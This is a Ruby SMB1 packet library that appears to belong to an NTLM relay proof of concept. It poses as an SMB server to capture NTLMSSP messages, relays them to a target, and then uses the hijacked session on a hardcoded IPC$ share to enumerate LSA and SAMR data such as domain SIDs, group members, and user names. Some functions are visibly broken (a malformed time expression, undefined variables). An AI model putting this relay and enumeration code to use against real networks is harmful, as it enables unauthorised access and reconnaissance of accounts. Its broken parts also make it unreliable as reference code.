#!/usr/bin/env ruby
#encoding: ASCII-8BIT
#require './poc_relay_smb_ews_constants'
require 'config'
require 'socket'

def Smbtime
    return [(Time.now.to_f +  + 11644473600) * 10000000].pack("q")
end 

module ZFsmb
  
  class Client
    attr_accessor :msgtype, :smbcmd, :smbpid, :smbuid, :smbplexid, :smbtreeid, :smbflags, :smbflags2, :bdata, :hdata, :smbstatus
    # client increments mutliplexid, pid set by client, server sets smbtreeid
    def initialize(pexist = "")
      if pexist != "" then #already set packet, let's disect it!
          if pexist[4..7] != "\xff\x53\x4d\x42" then
            raise "Not SMB1 Packet"
          end
          @msgtype = "\x00\x00"
          @smbcmd = pexist[8..8]
          @smbstatus = pexist[9..12]
          @smbflags = pexist[13..13]
          #@smbflags2 = "\x01\xc8"
          @smbflags2 = "\x01\xc8"
          #@smbflags2 = pexist[14..15] #zfdebug
          @smbpidhigh = pexist[16..17]
          @smbsig = pexist[18..25]
          @smbresv = pexist[26..27]
          @smbtreeid = pexist[28..29]
          @smbpid = pexist[30..31]
          @smbuid = pexist[32..33]
          @smbplexid = pexist[34..35]
          @bdata = "\x00"
          #if pexist[36..36] == "\x00" then @hdata = ""
          #else
            
          #end
          wct = (pexist[36..36].unpack('C')[0]) * 2
          if wct == 0 then @hdata = ""
          else @hdata = pexist[37,(wct).to_i] end
          bcc = pexist[37+wct,2].unpack("v")[0]
          if bcc == 0 then @bdata = ""
          else @bdata = pexist[(37+wct+2),bcc] end
            #@bdata = "\x41\x41\x41\x41\x41"
          #puts "wct = " + wct.to_s
          #puts "bcc = " + bcc.to_s
          #@hdata = pexist[36..]
          #TODO: Add rest of packet disection and recreation
        return
      end
      @msgtype = "\x00\x00" # Session Message Type
      @smbcmd = "\x00" # nego proto
      @smbstatus = "\x00\x00\x00\x00" #SUCCESS
      @smbflags = "\x00" 
      @smbflags2 = "\x01\xc8" #static set
      @smbpidhigh = "\x00\x00" #stays the same
      @smbsig = "\x00\x00\x00\x00\x00\x00\x00\x00" #fuck sigs
      @smbresv = "\x00\x00" # smb reserved?
      @smbtreeid = "\x00\x00"
      @smbpid = "\xfe\xde"
      @smbuid = "\x00\x00"
      @smbplexid = "\x00\x00"
      #@smbwct = "\x00" #wordcount - set by lengths auto
      #@smbbcc = "\x00\x00"# bytecout - set by lngths auto
      @hdata = "\x00"
      @bdata = "\x00"
      return
    end
  
    def craftresp(q="")
      if q=="" then return false end
      @smbflags = q.smbflags
      @smbpid = q.smbpid
      @smbuid = q.smbuid
      @smbplexid = q.smbplexid
      @smbcmd = q.smbcmd
    end
    def isResp()
      return  ((@smbflags.unpack("C")[0] & 0x80) == 0x80)
    end
    def getpacket
      # returns packet for sockets

      smbheader =  "\xff\x53\x4d\x42" + #SMB1
                   @smbcmd + @smbstatus + @smbflags + 
                   @smbflags2 + @smbpidhigh + @smbsig + @smbresv + @smbtreeid + 
                   @smbpid + @smbuid + @smbplexid
      smbbody = smbheader + self.builddata
      nheader = @msgtype + [smbbody.length].pack('n')
      return nheader + smbbody
    end
    
    def set_as_resp
      @smbflags = "\x98"
    end
    
    def set_as_req
      #@smbflags ="\x18"
      @smbflags ="\x08"
    end
    def builddata
      if (@hdata.length == 0) then build = "\x00"
      else build = [@hdata.length/2].pack("C") + @hdata  
      end
      if @bdata.length == 0 then build = build + "\x00\x00"
      else build = build + [@bdata.length].pack("v") + @bdata
      end
      return build
    end
    
  end # zfsmb
  
  class SmbSetupAndX < Client #Server Response for Negotiate Protocol Request
    attr_accessor :ntlmmsg, :os, :lmname
    def initialize(pkt)
      super
      pos = t2msg.index(/\x4e\x54\x4c\x4d\x53\x53\x50/)
      @ntlmmsg,len = parsentlm(@bdata)
      rawr = @bdata[pos..-1].split(/\x00\x00/)
      #puts rawr
    end
  end
  
  
  class SmbNegProtoRespa < Client #Server Response for Negotiate Protocol Request
    def initialize(pkt)
      rawr = pkt[39..-1].split( /\x02/ ) # TODO: cleanup this index finding....for some reason .index was being a bitch
      temppos = 0
      rawr.each_with_index do |moo, mooi|
        if (moo =~ /\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32/) # looking for the right NTLM version for SSP, will expand later for others
          temppos = mooi
        end
      end
      if (temppos > 0) #NTLM is in there somewhere
        super #build the packet using the passed pkt  - no need to increment anythign since we're server
        @smbcmd = "\x72"
        self.set_as_resp
        @hdata =  [temppos-1].pack("v") + # DIALECT INDEX! 
                  "\x03" + # security mode
                  "\x32\x00" + # max mpx count
                  "\x01\x00" + # max vcs
                  "\x04\x11\x00\x00" + # max buffer
                  "\x00\x00\x01\x00" + #max raw buffer
                  "\x00\x00\x00\x00" + #session key
                  "\xfc\xe3\x01\x80" + # supported capabilities - only one i care about is extended security exchanges
                  Smbtime() + 
                  "\x2c\x01" + #timezone - 300 min from UTC
                  "\x00" #keylength
         @bdata = GUID + "\x60\x28\x06\x06" + #GSSAPI
         "\x2b\x06\x01\x05\x05\x02" + #SPNEGO 
         "\xa0\x1e\x30\x1c\xa0\x1a\x30\x18\x06\x0a" + # bullshit packing and length checks
         "\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x1e" + # iso something?
         "\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a" # NTLMSSP
        return
      else
        return false #NTLM NOT SUPPORTED!!??!
      end
    end
  end
  
  class SetupAndXResp < Client
    def initialize (pkt, blob)
      super pkt
      @smbcmd = "\x73"
      self.set_as_resp
      @hdata =  "\xff" + #no further commands
                "\x00" + #reserved
                "\x80\x01" + #ANDXOFFSET!!!!?!?!
                "\x00\x00" + #Action
                [blob.length].pack('v') #blob length
      @bdata = blob + NativeOS.unpack("U*").pack("S*") + "\x00\x00" + NativeLM.unpack("U*").pack("S*") + "\x00\x00"
    end
  end
  
  def self.Smbclientnego(socket)
      a = Client.new()
      a.smbcmd = "\x72"
      a.set_as_req
      a.hdata = ""
      a.bdata = "\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00" #NTLM 0.12
      a.smbplexid = "\x01\x00"
      socket.write(a.getpacket)
      a.smbtreeid = "\xff\xff"
  end
  
  def self.Smbclientntlmnego(socket, msgtype, ntlmmsg, uid, rawpkt = nil)
    a = Client.new()
    a.set_as_req
    a.smbcmd = "\x73"
    buildmeup = "\x04\x82" + [ntlmmsg.length].pack('n') + ntlmmsg
    buildmeup = "\xa2\x82" + [buildmeup.length].pack('n') + buildmeup
    if (msgtype==1) then
      buildmeup = "\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a" + buildmeup
    end
    buildmeup = "\x30\x82" + [buildmeup.length].pack('n') + buildmeup
    if (msgtype==1) then
      buildmeup = "\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x82" + [buildmeup.length].pack('n') + buildmeup
      buildmeup = "\x60\x82" + [buildmeup.length].pack('n') + buildmeup
    elsif (msgtype==3) then
      buildmeup = "\xa1\x82" + [buildmeup.length].pack('n') + buildmeup
    end
    #a.bdata = buildmeup + NativeOS.unpack("U*").pack("S*") + "\x00\x00" + NativeLM.unpack("U*").pack("S*") + "\x00\x00"
    a.bdata = buildmeup + "\x00\x00" + "\x00\x00\x00"
    if (msgtype==3 && rawpkt != nil) then
      buildmeup = rawpkt[63,rawpkt[51,2].unpack("v")[0]]
      a.bdata = buildmeup+ "\x00\x00\x00\x00"
      a.smbtreeid = "\xff\xff"
    end
    
    
    a.hdata = "\xff" + #no further commands
              "\x00" + #reserved?
              "\x00\x00" + #andxoffset
              "\xff\xff" + #max buffer
              "\x02\x00" + #max mpx count 2?
              "\x01\x00" + #vc number?
              "\x00\x00\x00\x00" + #session key
              [buildmeup.length].pack('v') + # 4d00 - security blob length!!!
              "\x00\x00\x00\x00" + #reserved?
              "\x5c\xc0\x00\x80"  #capabilities - adjust!
    
    if (msgtype==1) then 
    a.smbplexid = "\x02\x00"
    else
      a.smbplexid = "\x03\x00"
      a.smbuid = uid
    end
    socket.write(a.getpacket)
    if (msgtype==3) then
      #gheto temp testing work. cleanup later
#      Doshit(socket)
    end
  end
  
  
  def self.Smbclientntlmnego2(socket, resp, userid)
    b = Client.new(resp)
    a = Client.new()
    a.set_as_req

    a.smbcmd = "\x73"
    a.bdata = b.bdata
    buildmeup = b.bdata.length-4
    a.hdata = "\xff" + #no further commands
              "\x00" + #reserved?
              "\x00\x00" + #andxoffset
              "\xff\xff" + #max buffer
              "\x02\x00" + #max mpx count 2?
              "\x01\x00" + #vc number?
              "\x00\x00\x00\x00" + #session key
              [buildmeup].pack('v') + # 4d00 - security blob length!!!
              "\x00\x00\x00\x00" + #reserved?
              "\x5c\xc0\x00\x80"  #capabilities - adjust!
      a.smbuid = userid
       
      a.smbplexid = "\x03\x00"
      #a.smbuid = "\x00\x08"
    socket.write(a.getpacket)

  end
  
  
  
  class SmbTreeConnectAndX < Client # TODO WORKON
    def initialize (uid)
      super()
      self.set_as_req
      self.smbplexid = "\x04\x00"
      self.smbcmd = "\x75"
      self.smbuid = uid
      self.smbtreeid = "\xff\xff"
      self.hdata =  "\xff" + #AndXCmd = No Furhter Commands 
                    "\x00" + #reserved
                    "\x00\x00" + # Andxoffset
                    "\x08\x00" + # AndXFlags
                    "\x01\x00" # PasswordLength  
      self.bdata =  "\x00" + # Password
                    "\\\\10.1.10.12\\IPC$".unpack("U*").pack("S*") + "\x00\x00" + #Path
                    "IPC" + "\x00" #Service
    end
  end
  
  class SmbNTCreateAndX < Client
    def initialize(uid,path="\\lsarpc")
      super()
      self.smbuid = uid      
      self.smbcmd = "\xa2"
      self.set_as_req
      self.smbplexid = "\x05\x00"
      filename = path.unpack("U*").pack("S*") + "\x00\x00"
      self.smbtreeid = "\x00\x08"
      self.hdata =  "\xff" + # No Further AndXCmds
                    "\x00" + #reserved
                    "\x00\x00" + #AndxOffset
                    "\x00" + #reserved
                    [filename.length].pack("v") + #FILE NAME LEN!
                    "\x00\x00\x00\x00" + #CreateFlags
                    "\x00\x00\x00\x00" + #RootFID
                    "\x9f\x01\x02\x00" + #AccessMask
                    ("\x00" * 8) + #Allocaiton Size
                    ("\x00" * 4) + #File Attributes
                    "\x03\x00\x00\x00" + #Share Access (share write / read)
                    "\x01\x00\x00\x00" + # Disposition
                    "\x00\x00\x00\x00" + #Create Options
                    "\x02\x00\x00\x00" + #Impersonation
                    "\x00" #security flags
      self.bdata = "\x00" + filename
    end
  end
  
  class SMBReauth < Client
    def initialize(pkt)
      super
      self.set_as_resp
      self.smbstatus = "\x5c\x03\x00\xc0"
      self.bdata = ""
      self.hdata = ""
    end
  end
  
  class SMBClose < Client
    def initialize(fid,uid)
      super()
      self.smbuid = uid      
      self.smbcmd = "\x04"
      self.set_as_req
      self.smbplexid = "\x0a\x00"
      self.smbtreeid = "\x00\x08"
      self.hdata = fid + "\xff\xff\xff\xff"
      self.bdata = ""
    end
  end
  
  class SMBTrans < Client
    def initialize
      super
      self.smbcmd = "\x25"
      self.set_as_req
      self.smbuid = "\x00\x08"
      self.smbtreeid = "\x00\x08"


                 #yardata3 = Requests - packet type 00
    @yardata3 = "\x24\x00\x00\x00" + #ALLOC HINT! - lenght of reqest
                 "\x00\x00" + #context id
                 "\x00\x00" # Op Num!

                  #obnum 5
 @lsaOpenPolicy = "\x00\x00\x02\x00" + # REFERANT ID!! to match
                  "\x53\x00" + #system name?!?!
                  "\x00\x00" + 
                  "\x18\x00\x00\x00" + #length
                  "\x00\x00\x00\x00" + #ponter to root dir
                  "\x00\x00\x00\x00" + # pointer to object name
                  "\x00\x00\x00\x00" + #attributes
                  "\x00\x00\x00\x00" + # Pointer to sec desc
                  "\x00\x00\x00\x00" + # pointer to sec qos
                  "\x00\x00\x00\x02" #flags
                  
                   #opnum 7
  @lsaqueryinfopolicy = "\x00" * 20 + #Policy handle gotten in return of lsaopenpolicy
                        "\x05\x00" #level
                        
                   #opnum 0
 @lsacloserequest = "\x00" * 20  #Policy handle gotten in return of lsaopenpolicy        
  
    end
    def setfid(fid)
      @fileid = fid[0..2]
    end
    def getpacket()
         yardata = "\x05" + #Major Version 5
                   "\x00" + #Minor Version 0
                   @packettype + # 1 byte
                   "\x03" + #packet flags
                   "\x10\x00\x00\x00" + #Data Representation - Little Endian Ascii Ieee
                   "\xff\xff" + # FRAG LENGTH!! (length of @yardata!)
                   "\x00\x00" + # Auth Length
                   @callid + #Call ID!! (14 here)
                   @sdata #changes between data types herein                 
   yardata[8..9] = [yardata.length].pack('v') #set frag length
      self.hdata = "\x00\x00" + #parameter total count
                   [yardata.length].pack('v') + # TOTAL DATA COUNT!!
                   "\x00\x00" + #Max Parameter Count
                   "\xb8\x10" + #Max Data Count
                   "\x00" + #MaxSetup Count?
                   "\x00" + #reserved
                   "\x00\x00" + #flags
                   "\x00\x00\x00\x00" + #timeout = return immediately
                   "\x00\x00" + #reserved
                   "\x00\x00" + #Parameter Count
                   "\x52\x00" + #PARAMETER OFFSET!
                   [yardata.length].pack('v') + #DATA COUNT!
                   "\x52\x00" + #DATA OFFSET!
                   "\x02" + #SETUP COUNT!
                   "\x00" + #reserved
                   "\x26\x00" + #fxn transactnmpipe
                   @fileid # FID!
      self.bdata = "\x00" + "\\PIPE\\".unpack("U*").pack("S*") + "\x00\x00" + #pipe
                   yardata
      super
    end
  end
  
  def self.Doshit(s, uid)
    q, x = s.recvfrom(2000)
    f = SmbTreeConnectAndX.new(uid)
    s.write(f.getpacket)
    q, x = s.recvfrom(2000)
    # TODO: Parse TREEID From Response!
    f2 = SmbNTCreateAndX.new(uid)
    s.write(f2.getpacket)
    q, x = s.recvfrom(2000)
    f3 = SMBTrans.new
    f3.setfid(q[42,2])
    s.write(f3.getpacket)
    q, x = s.recvfrom(2000)
  end
  
  class SMBTransDCEBind < SMBTrans
    def initialize (type=1)
      @packettype = "\x0b" #packet type = bind(11)
      
      @fileid = "\x00\x00"
      super()
      if type==1 then #lsarpc
        @callid = "\x01\x00\x00\x00"
        uuid = "\x78\x57\x34\x12\x34\x12\xcd\xab\xef\x00\x01\x23\x45\x67\x89\xab"
        vers = "\x00\x00"
      elsif type==2 then #samr
        @callid = "\x05\x00\x00\x00"
        uuid = "\x78\x57\x34\x12\x34\x12\xcd\xab\xef\x00\x01\x23\x45\x67\x89\xac"
        vers = "\x01\x00"
      end
      @sdata = "\xb8\x10" + #max xmit frag
                 "\xb8\x10" + #max recv frag
                 "\x00\x00\x00\x00" + #Assoc Group
                 "\x01" + #Num CTX Items (1)
                 "\x00\x00\x00" + 
                 "\x00\x00" + #Context ID 0
                 "\x01" + #number trans items 1
                 "\x00" + 
                 uuid + #LSARPC UUID
                 vers + #major version
                 "\x00\x00" + #minor version
                 "\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60" + #Transport Syntex UUID
                 "\x02\x00\x00\x00" #version
    end
  end
  
  class LsaOpenPolicy < SMBTrans
    def initialize(fileid)
      @packettype = "\x00" #packet type = bind(11)
      @callid = "\x02\x00\x00\x00"
      @fileid = fileid
      super()
      yardata = "\x00\x00\x02\x00" + # REFERANT ID!! to match
                #"\x53\x00" + #system name?!?!
                "\x5c\x00" + #system name?!?!
                "\x00\x00" + 
                "\x18\x00\x00\x00" + #length
                "\x00\x00\x00\x00" + #ponter to root dir
                "\x00\x00\x00\x00" + # pointer to object name
                "\x00\x00\x00\x00" + #attributes
                "\x00\x00\x00\x00" + # Pointer to sec desc
                "\x00\x00\x00\x00" + # pointer to sec qos
                "\x00\x00\x00\x02" #flags
      @sdata = [yardata.length].pack("v") + "\x00\x00" + #ALLOC HINT! - lenght of reqest
               "\x00\x00" + #context id
               "\x06\x00" + # Op Num!
               yardata
    end
  end
  
  class LsaQueryInfoPolicy < SMBTrans
    def initialize (handle, fileid)
      @packettype = "\x00" #packet type = request
      @callid = "\x03\x00\x00\x00"
      @fileid = fileid
      super()
      yardata = handle + "\x05\x00"
      @sdata = [yardata.length].pack("v") + "\x00\x00" + #ALLOC HINT! - lenght of reqest
               "\x00\x00" + #context id
               "\x07\x00" + # Op Num!
               yardata
    end
  end
  class LsaClose < SMBTrans
    def initialize (handle, fileid)
      @packettype = "\x00" #packet type = request
      @callid = "\x04\x00\x00\x00"
      @fileid = fileid
      super()
      @sdata = [handle.length].pack("v") + "\x00\x00" + #ALLOC HINT! - lenght of reqest
               "\x00\x00" + #context id
               "\x00\x00" + # Op Num!
               handle
    end
  end
  
  class SamrClose < SMBTrans
    def initialize (handle, fileid)
      @packettype = "\x00" #packet type = request
      @callid = "\x04\x00\x00\x00"
      @fileid = fileid
      super()
      @sdata = [handle.length].pack("v") + "\x00\x00" + #ALLOC HINT! - lenght of reqest
               "\x00\x00" + #context id
               "\x01\x00" + # Op Num!
               handle
    end
  end
  
  class SamrConnect < SMBTrans
    def initialize (tip, fileid)
      @packettype = "\x00" #packet type = request
      @callid = "\x06\x00\x00\x00"
      @fileid = fileid
      tipaddr = tip.unpack("U*").pack("S*") + "\x00\x00"
      super()
      data = "\x00\x00\x02\x00" + #referant id
             [tipaddr.length/2].pack("v") + "\x00\x00" + #max count
             "\x00\x00\x00\x00" + #offset 
             [tipaddr.length/2].pack("v") + "\x00\x00" + #actual count
             tipaddr + "\x00\x00" +
             "\x00\x00\x00\x02" # access mask
      @sdata = [data.length].pack("v") + "\x00\x00" + #ALLOC HINT! - lenght of reqest
             "\x00\x00" + #context id
             "\x39\x00" + # Op Num!
             data
    end
  end
  
  class SamrOpenDomain < SMBTrans
    def initialize (handle, fileid,sid)
      @packettype = "\x00" #packet type = request
      @callid = "\x07\x00\x00\x00"
      @fileid = fileid
      super()
      yardata = handle + 
                "\x00\x00\x00\x02" + #access mask
                [ZFsmb::Sidcount(sid)].pack("V") + #sid count???
                sid
      @sdata = [yardata.length].pack("v") + "\x00\x00" + #ALLOC HINT! - lenght of reqest
               "\x00\x00" + #context id
               "\x07\x00" + # Op Num!
               yardata
    end
  end
  
  class SamrLookupNames < SMBTrans
    def initialize (handle, fileid, names)
      @packettype = "\x00" #packet type = request
      @callid = "\x0b\x00\x00\x00"
      @fileid = fileid
      super()
      name = names.unpack("U*").pack("S*")
      yardata = handle + 
                "\x01\x00\x00\x00" + #number of names
                "\xe8\x03\x00\x00" + #maxcount
                "\x00\x00\x00\x00" + #offset
                "\x01\x00\x00\x00" + #actual number of names
                [name.length].pack("v") + 
                [name.length].pack("v") + 
                "\x00\x00\x02\x00" + #referant id
                [name.length/2].pack("v") + "\x00\x00" + #maxcount
                "\x00\x00\x00\x00" + #offset
                [name.length/2].pack("v") + "\x00\x00" + #actualcount
                name
      @sdata = [yardata.length].pack("v") + "\x00\x00" + #ALLOC HINT! - lenght of reqest
               "\x00\x00" + #context id
               "\x11\x00" + # Op Num!
               yardata
    end
  end
  
  class SamrOpenAlias < SMBTrans
    def initialize (handle, fileid, rid)
      @packettype = "\x00" #packet type = request
      @callid = "\x0c\x00\x00\x00"
      @fileid = fileid
      super()
      yardata = handle +
                "\x00\x00\x00\x02" + #accessmask
                rid
      @sdata = [yardata.length].pack("v") + "\x00\x00" + #ALLOC HINT! - lenght of reqest
               "\x00\x00" + #context id
               "\x1b\x00" + # Op Num!
               yardata
    end
  end
  
  class SamrGetMembersInAlias < SMBTrans
    def initialize (handle, fileid)
      @packettype = "\x00" #packet type = request
      @callid = "\x0d\x00\x00\x00"
      @fileid = fileid
      super()
      @sdata = [handle.length].pack("v") + "\x00\x00" + #ALLOC HINT! - lenght of reqest
               "\x00\x00" + #context id
               "\x21\x00" + # Op Num!
               handle
    end
  end
  
  class LsaLookupSids < SMBTrans
    def initialize(handle, fileid, sids)
      @packettype = "\x00" #packet type = request
      @callid = "\x0d\x00\x00\x00"
      @fileid = fileid
      super()
      names = "\x00\x00\x00\x00" + #names count
              "\x00\x00\x00\x00" + #names null
              "\x01\x00" + # names level
              "\x00\x00" + 
              "\x00\x00\x00\x00" #names count 
      yardata = handle + 
                [sids.length].pack("V") + #number of sids
                "\x00\x00\x02\x00" + #referantid
                [sids.length].pack("V") #max count
                sids.each do |key, value|
                    yardata = yardata + key
                end
                sids.each do |key, value|
                    yardata = yardata + [ZFsmb.Sidcount(value)].pack("V") + value
                end
                yardata = yardata + names
      @sdata = [yardata.length].pack("v") + "\x00\x00" + #ALLOC HINT! - lenght of reqest
               "\x00\x00" + #context id
               "\x0f\x00" + # Op Num!
               yardata
    end
  end
  
  def self.ParseSamrLookup(q)
    return q[96,4]
  end
  
  def self.ParseGetMembersInAlias(q)
    numsids = q[84,4].unpack("V")[0]
    sidreferentid = q[88,4]
    sidmaxcount = q[92,4].unpack("V")
    i = 0
    h = Hash.new
    pos = 96
    distance = pos+(4*numsids)
    while i < numsids
      referentid = q[pos,4]
      count = q[distance,4].unpack("V")[0]
      if count == 5 then range = 28
      elsif count == 4 then range = 24
      elsif count == 1 then range = 12
      end
      h[referentid] = q[distance+4,range]
      pos = pos+4
      distance = distance + range + 4
      i = i+1
    end
    return h
  end
  def self.Sidcount(sid)
    if sid.length == 28 then return 5
    elsif sid.length <17 then return 1
    elsif sid.length == 24 then return 4
    else puts "WTF" + sid.length.to_s
      return 0
    end
  end
  def self.Parselookupsid(q, sidreq)
    sidsrequest =Hash.new 
    i=0
    sidreq.each do |key,value|
       sidsrequest[i] = value
       i = i+1
    end 
    domainreferent = q[84,4]
    numdomains = q[88,4].unpack("V")[0]
    domainreferent2 = q[92,4]
    domainmaxsize = q[96,4].unpack("V")
    lsadomaininfomaxcount = q[100,4].unpack("V") 
    pos = 104
    i = 0
    d= Hash.new
    while i < numdomains
      dlength = q[pos,2]
      dsize = q[pos+2,2]
      dreferentid = q[pos+4,4] #for string
      dreferentidsid = q[pos+8,4]
      i = i+1
      #d[dreferentid] = {"sidref" => dreferentidsid}
      pos = pos+12
    end
    i=0
    while i< numdomains
      dmaxcount = q[pos,4].unpack("V")[0]*2
      doffset = q[pos+4,4].unpack("V")[0]*2
      dactualcount = q[pos+8,4].unpack("V")[0]
      domain = q[pos+12+doffset,dactualcount*2]
      if (dactualcount%2==1) then  
        pos = pos + 12 + doffset + dactualcount*2 +2 #fucking odd nullbytes
      else pos = pos + 12 + doffset + dactualcount*2 end
      scount = q[pos,4].unpack("V")[0]
      if scount == q[pos,4].unpack("V") then sidlen = 8
      elsif scount == 1 then sidlen = 12
      elsif scount == 4 then sidlen = 24
      elsif scount == 5 then sidlen = 28
      elsif scount == 0 then sidlen = 8
      else sidlen = 0
        puts "WTFsidlen"
      end
      sid = q[pos+4,sidlen]
      d[i] = domain
      pos = pos+4+sidlen
      i = i+1

    end
    ncount = q[pos,4].unpack("V")[0]
    nrefid = q[pos+4,4]
    nmaxcount = q[pos+8,4].unpack("V")[0]
    pos = pos+12
    i = 0
    u = Hash.new
    while (i<nmaxcount)
      ntype = q[pos,2].unpack("v")[0]
      # 00,00?
      nlen = q[pos+4,2].unpack("v")[0]
      nsize = q[pos+6,2].unpack("v")[0]
      nref = q[pos+8,4]
      nsidindex = q[pos+12,4].unpack("V")[0]
      u[i] = {"sidi" => nsidindex, "type" => ntype} 
      pos = pos +16
      i = i+1
      #u[nref] = {"sid" => nsidindex}
    end
    i = 0
    u.each do |key, value|
      n2maxcount = q[pos,4].unpack("V")[0]
      noffset = q[pos+4,4].unpack("V")[0]
      ncount = q[pos+8,4].unpack("V")[0]
      if value["type"]== 1 then type="User"
      elsif value["type"] == 2 then type="Group"
      else type ="UNKNOWN"
      end
      puts type + "! " + d[value["sidi"]].to_s + "\\" + q[pos+12,ncount*2].to_s
      puts "SID " + ZFsmb.Parsesid(sidsrequest[i])
      pos = pos + 12 + (ncount*2)
      if ((ncount %2 )==1) then
        pos = pos + 2 #fucking null bytes
      end
      i = i +1
    end
  end
  def self.Parsesid(sid)
    if sid.length == 28 then
      return "S-" + sid[0,1].unpack("C")[0].to_s + "-" + sid[1,1].unpack("C")[0].to_s + "-" + sid[8,4].unpack("V")[0].to_s + "-" + sid[12,4].unpack("V")[0].to_s + "-" + sid[16,4].unpack("V")[0].to_s + "-" + sid[20,4].unpack("V")[0].to_s + "-" + sid[24,4].unpack("V")[0].to_s
    else return "S?" end
  end
  def self.ParsesidFromLSA(q)
    #gheto hax! fuck real parsing
    #TODO: add name parsing too
    len = q.length
    return q[len-28,24]
  end
  def self.Parseresponse(q)
    offset = "a"
    length = "b"
  end
  def self.Parsehandle(q)
    #gheto hax! fuck real parsing
    len = q.length
    return q[len-24,20] 
  end
  def self.Parsentlmfromspnego(t2msg)
    # TODO fix parsing so instead of just looking one bit back, it actually parses - gheto hacked together right now
    pos = t2msg.index(/\x4e\x54\x4c\x4d\x53\x53\x50/)
    if !(pos==nil) then
      if t2msg[pos-3,1] == "\x82" then len = t2msg[pos-2,2].unpack("n")[0]
      else len = t2msg[pos-1,1].unpack("C")[0] 
        end
      return t2msg[pos,len]
    else return '' end
  end
  
  def self.Buildtype2gssapi(ntlmtype2)
    buildup = "\x04\x82" + [ntlmtype2.length].pack('n') + ntlmtype2
    buildup = "\xa0\x03\x0a\x01\x01\xa1\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a\xa2" + "\x82" + [buildup.length].pack('n') + buildup
    buildup = "\x30\x82" + [buildup.length].pack('n') + buildup
    buildup = "\xa1\x82" + [buildup.length].pack('n') + buildup
    return buildup
  end
  
end
